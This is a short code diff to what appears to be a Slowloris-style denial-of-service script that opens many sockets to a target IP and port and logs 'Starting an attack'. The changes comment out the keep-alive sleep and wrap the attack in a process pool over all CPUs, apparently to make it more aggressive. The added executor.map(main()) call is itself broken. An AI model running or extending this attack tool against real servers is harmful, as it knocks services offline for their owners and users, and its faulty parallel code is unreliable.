@@ -1,3 +1,7 @@
+from concurrent.futures.process import ProcessPoolExecutor
+from concurrent.futures.thread import ThreadPoolExecutor
+from multiprocessing import cpu_count
+
 from http import headers
 import argparse
 import logging
@@ -60,6 +64,7 @@ def main():
     socket_count = args.sockets
     logging.info("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
     logging.info("Creating {} sockets...".format(socket_count))
+
     for i in range(socket_count):
         try:
             s = connect(ip)
@@ -94,7 +99,10 @@ def main():
                 break
 
         logging.debug("Sleeping for 15 seconds in order to keep the connection alive.\n")
-        time.sleep(15)
+        #time.sleep(15)
 
 
-main()
+if __name__ == "__main__":
+    with ProcessPoolExecutor(max_workers=cpu_count()) as executor:
+        out_list = list(executor.map(main()))
+
